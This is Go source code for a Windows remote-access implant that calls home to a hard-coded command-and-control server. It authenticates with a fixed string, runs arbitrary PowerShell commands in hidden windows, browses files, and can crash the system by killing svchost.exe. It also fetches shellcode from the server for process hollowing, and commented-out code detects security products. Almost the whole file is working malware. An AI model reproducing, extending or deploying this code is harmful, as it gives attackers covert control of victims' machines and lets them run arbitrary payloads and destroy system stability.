package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"syscall"
	"time"

	"github.com/D3Ext/maldev/shellcode"
	// "github.com/faiface/beep"
	// "github.com/faiface/beep/mp3"
	// "github.com/faiface/beep/speaker"
	//"github.com/MarinX/keylogger"
)

func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
	if *attempts > 3 {
		terminate()
	}
	addr, err := net.Dial("tcp", *c2Address)
	if err != nil {
		fmt.Println("Couldn't establish a connection")
		*attempts = *attempts + 1
		time.Sleep(10 * time.Second)
		return addr, false
	}
	buffer := make([]byte, 100)
	read_len, err := addr.Read(buffer)
	if read_len <= 1 {
		fmt.Println("Error with size of buffer")
		return addr, false
	}
	if err != nil {
		fmt.Println("A general network error has occured")
		return addr, false
	}
	bufferSnapped := buffer[:read_len]
	bufferStr := string(bufferSnapped)
	if bufferStr != "AreYouAlive\n" {
		os.Exit(1)
	}
	reply2Auth(&addr)
	*attempts = 0
	return addr, true
}

func reply2Auth(conn *net.Conn) {
	(*conn).Write([]byte("i_L0V_y0U_Ju5t1n_P3t3R\n"))
}

func listen4Commands(conn *net.Conn) string {
	request := make([]byte, 9000)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		os.Exit(0)
	}
	if err != nil {
		os.Exit(0)
	}
	command := string(request[:read_len])
	return command
}

func executeCommands(conn *net.Conn, command *string) {
	if *command == "stop\n" {
		terminate()
	}
	powershellPath := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
	ps_instance := exec.Command(powershellPath, "/c", *command)
	ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Learn how syscalls work ktiir 2awiyeh
	output, err := ps_instance.Output()
	if err != nil {
		output = []byte("Couldn't execute the command\n")
		fmt.Println("Couldnt Execute the command")
	}
	(*conn).Write(output)
}

// func checkSec() []string {
// 	products := []string{}
// 	procs, err := process.GetProcesses()
// 	if err != nil {
// 		fmt.Println("Couldn't Get Processes")
// 	}
// 	for index := range procs {
// 		if procs[index].Exe == "MsMpEng.exe" {
// 			products = append(products, "Defender")
// 		}
// 		if procs[index].Exe == "CSFalconService.exe" {
// 			products = append(products, "CrowdStrike")
// 		}
// 	}
// 	return products
// }

func terminate() {
	fmt.Println("Terminating Implant")
	time.Sleep(1 * time.Second)
	os.Exit(0)
}

func cd(conn *net.Conn, pImplantWD *string) {
	buff := make([]byte, 99999)
	read_len, err := (*conn).Read(buff)
	if err != nil {
		fmt.Println("Something went wrong")
		return
	}
	if read_len <= 1 {
		fmt.Println("Something went wrong")
		return
	}
	buffSnapped := buff[:read_len]
	regexCD := regexp.MustCompile(`cd\s+.+`)
	matchCD := regexCD.FindString(string(buffSnapped))
	if matchCD != "" {
		dir2go := strings.Split(matchCD, " ")[1]
		// implantWD := os.Chdir(dir2go)
		if os.Chdir(dir2go) != nil {
			//(*conn).Write([]byte("Error getting the dir\n"))
			fmt.Println("Couldn't find the dir")
		} else {
			*pImplantWD, _ = os.Getwd()
			fmt.Println(*pImplantWD)
			fmt.Println("Exiting")
			//(*conn).Write([]byte(*pImplantWD + "\n"))
		}
	}
}

func ls(conn *net.Conn, implantWD *string) {
	dirFS, _ := os.ReadDir(*implantWD)
	dirListing := ""
	for e := range dirFS {
		dirInfo, _ := dirFS[e].Info()
		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "	" + dirInfo.Name() + "\n"
	}
	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n" +
		"		----		" + "----		" + "	----" + "\n" +
		dirListing + "\n")) //Looks funky but I want it organized
}

// func receiveNPlayAudio(conn *net.Conn) { //Needs some fixing
// 	fmt.Println("Recieveing Audio ...")
// 	music := make([]byte, 3145728) //Track limit is 3MB
// 	read_len, err := (*conn).Read(music)
// 	if err != nil {
// 		fmt.Println("Couldnt Play the Track")
// 		return
// 	}
// 	if read_len < 1 {
// 		fmt.Println("Couldnt Play the Track")
// 		return
// 	}
// 	musicCut := music[:read_len]
// 	musicBytesReader := bytes.NewReader(musicCut)
// 	streamer, format, err := mp3.Decode(musicBytesReader)
// 	if err != nil {
// 		fmt.Println("Something Wrong")
// 	}
// 	speaker.Init(format.SampleRate, format.SampleRate.N(time.Second/10))
// 	buffer := beep.NewBuffer(format)
// 	buffer.Append(streamer)
// 	streamer.Close()
// 	take := buffer.Streamer(0, buffer.Len())
// 	speaker.Play(take)
// }

func main() {
	c2Address := "192.168.5.222:444"
	attempts := 0
	implantWD, _ := os.Getwd()
	fmt.Println("Implant Started")
	conn, result := callHome(&c2Address, &attempts)
	// if !result {
	// 	fmt.Println("Couldn't call home")
	// 	os.Exit(0)
	// }
	for !result {
		conn, result = callHome(&c2Address, &attempts)
	}
	for { //Main Program Loop
		command := listen4Commands(&conn)
		fmt.Println(command)
		switch command {
		case "AreYouAlive\n":
			reply2Auth(&conn)
		case "SelfDestruct\n": //This only works if it has admin privs. It is the BSOD.
			{
				ps_instance := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "/c", "taskkill.exe", "/f", "/im", "svchost.exe")
				ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
				output, err := ps_instance.Output()
				if err != nil {
					fmt.Println("Couldnt Execute the command")
				}
				fmt.Println(output)
				conn.Write([]byte("NoTime2Die\n"))
			}
		// case "play\n":
		// 	{
		// 		receiveNPlayAudio(&conn) //Needs time 2 fix
		// 	}
		case "barCode\n":
			{
				barCodeLoad(&conn)
			}
		case "cd\n":
			{
				cd(&conn, &implantWD)
			}
		case "butterInjection\n":
			{
				fmt.Println("Chicken Kiev")
			}
		case "ls\n":
			{
				ls(&conn, &implantWD)
			}
		case "pwd\n":
			{
				fmt.Println(implantWD)
				conn.Write([]byte(implantWD))
			}
		case "hollow\n":
			{
				//Hardcore method below
				conn.Write([]byte("OK\n"))
				//Check if the file even exists
				buffer := make([]byte, 60838412)
				read_len, err := conn.Read(buffer)
				if err != nil {
					fmt.Println("Problem Reading the buffer")
					conn.Write([]byte("Return"))
					return
				}
				if read_len <= 1 {
					fmt.Println("Problem with Buffer Size")
					conn.Write([]byte("Return"))
					return
				}
				filePath := string(buffer[:read_len])
				fmt.Println(filePath)
				//filePath = "C:\\Program Files\\Internet Explorer\\iexplore.exe"
				_, err = os.Stat(filePath)
				if err != nil {
					fmt.Println("The binary does not exist !!! Path: " + filePath)
					fmt.Println()
					conn.Write([]byte("File does not exist"))
					return
				}
				conn.Write([]byte("OK\n"))
				fmt.Println("The file exists and is readable: " + filePath)
				// Ez way
				c2URL := strings.Split(c2Address, ":")[0]
				c2URL = "http://" + c2URL + "8080"
				sc, err := shellcode.GetShellcodeFromUrl(c2URL)
				if err != nil {
					fmt.Println("Couldn't get shellcode")
					return
				}
				// //Create a buffer to recieve the shellcode and fire it
				// read_len, err = conn.Read(buffer)
				// if err != nil {
				// 	fmt.Println("Problem Reading the buffer")
				// 	conn.Write([]byte("Return"))
				// 	return
				// }
				// if read_len <= 1 {
				// 	fmt.Println("Problem with Buffer Size")
				// 	conn.Write([]byte("Return"))
				// 	return
				// }
				// sc := buffer[:read_len]
				// conn.Write([]byte("OK\n"))
				// fmt.Println("Shellcode Recieved Commencing Hollowing")
				hollow(&conn, sc, filePath)
			}
		default: //TO-DO: turning the default into an error statement and appending all shell commands with a ">.<" to avoid crashes
			executeCommands(&conn, &command)
		}
	}
}
